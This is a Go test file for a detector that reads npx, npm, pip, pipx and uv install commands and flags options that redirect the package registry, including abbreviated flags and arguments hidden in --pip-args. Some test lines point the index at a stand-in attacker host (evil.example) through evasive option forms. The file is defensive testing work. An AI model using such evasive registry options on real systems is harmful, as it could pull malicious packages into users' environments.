package installread

import (
	"slices"
	"testing"
)

// READER-VAR-OPT-1 round 4 (ADR-0159 round 11). Placeholders zz-var-pkg only.

// npx -c CMD, npx --call=CMD and npm exec -c CMD: npm reads its options after the command string too (the re-review:
// npx -c 'echo $npm_config_registry' --registry=URL printed URL), so a hidden word after -c can move the registry.
// unseenCommandWord stops at -c (the command follows it, Q3) and does not see that word. Such a line keeps its reason
// only because the second reader gives command_string to every -c/--call line (extra.go, launcher: npmCall). This test
// pins that coupling: if command_string is ever narrowed, it fails, and unseenCommandWord must read on past -c for npm.
func TestReaderVarOpt4NpxCallTailKeepsAReason(t *testing.T) {
	for _, line := range []string{
		`npx -p zz-var-pkg -c zzbin "$P"`,
		`npx -p zz-var-pkg --call=zzbin "$P"`,
		`npm exec -p zz-var-pkg -c zzbin "$P"`,
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, "command_string") {
			t.Errorf("%q: codes %v, want command_string (the second reader's, which this line's reason depends on)", line, codes)
		}
	}
}

// S1: the index options by their parser's dest, aliases and abbreviations included, in every place pip's words are
// read (also --pip-args and python -m pip); the table and the index sets agree with the parsers.
func TestReaderVarOpt4IndexByDest(t *testing.T) {
	for _, line := range []string{
		"pip install --pypi-url=/srv/simple zz-var-pkg",
		"pip install --extra-index-url /srv/simple zz-var-pkg",
		"pip install --extra-index /srv/simple zz-var-pkg", // optparse's abbreviation
		"pip install --find-l /srv/wheels zz-var-pkg",
		"pipx install --index-u /srv/simple zz-var-pkg",
		"pipx run --i /srv/simple zz-var-pkg",
		"uv pip install --extra-index-url /srv/simple zz-var-pkg",
		"uvx --default-index /srv/simple zz-var-pkg",
		"uv add --index /srv/simple zz-var-pkg",
		"pipx install zz-var-pkg --pip-args='--pyp=/srv/simple'",
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, "custom_registry") {
			t.Errorf("%q: codes %v, want custom_registry", line, codes)
		}
	}
	for form, names := range map[string][]string{
		"pip install":    {"-i", "--index-url", "--pypi-url", "--extra-index-url", "-f", "--find-links"},
		"pipx install":   {"-i", "--index-url"},
		"pipx run":       {"-i", "--index-url"},
		"uv pip install": {"-i", "--index-url", "--extra-index-url", "-f", "--find-links", "--index", "--default-index"},
		"uv tool run":    {"-i", "--index-url", "--find-links", "--index"},
	} {
		for _, n := range names {
			if !pyIndexOptions[form][n] {
				t.Errorf("%s %s: not an index option in the generated set", form, n)
			}
		}
	}
	for form, n := range map[string]string{"pipx install": "-f", "pip install": "--no-index", "uv pip install": "--no-index"} {
		if pyIndexOptions[form][n] {
			t.Errorf("%s %s: in the index set, but it names no index", form, n)
		}
	}
	// a public index by the hidden alias stays plain
	if tg, codes := codesOn("pip install --pypi-url https://pypi.org/simple zz-var-pkg"); len(codes) > 0 ||
		!slices.Equal(tg, []string{"pypi:zz-var-pkg"}) {
		t.Errorf("--pypi-url to the public index: targets %v, codes %v", tg, codes)
	}
}

// S2: options clap hides from every help are in the tables (the generator probes every word of the uv binary).
func TestReaderVarOpt4UvHiddenOptions(t *testing.T) {
	for form, names := range map[string][]string{
		"uv tool run":     {"--python-preference", "--preview-features", "--override", "--constraint"},
		"uv tool install": {"--python-preference"},
		"uv pip install":  {"--override", "--constraint", "--requirement", "--exclude"},
	} {
		for _, n := range names {
			if !pyOptions[form][n] {
				t.Errorf("%s %s: missing from the table, or no value", form, n)
			}
		}
	}
}

// Outside the forms the tables have (uv pip "$P" install: the hidden word stands where the subcommand would be), the
// index options are the union of the generated sets (registryFlags), long and short.
func TestReaderVarOpt4IndexFallback(t *testing.T) {
	for _, line := range []string{
		`uv pip "$P" install --index-url /srv/simple zz-var-pkg`,
		`uv pip "$P" install --pypi-url /srv/simple zz-var-pkg`,
		`uv pip "$P" install -ihttps://evil.example/simple zz-var-pkg`,
		`uv pip "$P" install -Uf /srv/wheels zz-var-pkg`,
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, "custom_registry") {
			t.Errorf("%q: codes %v, want custom_registry", line, codes)
		}
	}
}

// S3: --pip-args is always read both ways. A quoted "-i" is an index only to the POSIX split (pipx on Linux and macOS
// strips the quotes; on Windows they stay and pip gets no -i), a quote inside a word only to the Windows one.
func TestReaderVarOpt4PipArgsBothSplits(t *testing.T) {
	for _, line := range []string{
		`pipx install zz-var-pkg --pip-args='"-i" https://evil.example/simple'`,
		`pipx install zz-var-pkg --pip-args='--src=x"y -i C:/idx --src=z"'`,
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, "custom_registry") {
			t.Errorf("%q: codes %v, want custom_registry", line, codes)
		}
	}
	// outside pipx's forms its -f stays --force in a cluster, not find-links
	if _, codes := codesOn("pipx -w x run -fq zz-var-pkg"); slices.Contains(codes, "custom_registry") {
		t.Errorf("pipx -w x run -fq: codes %v, want no custom_registry", codes)
	}
}
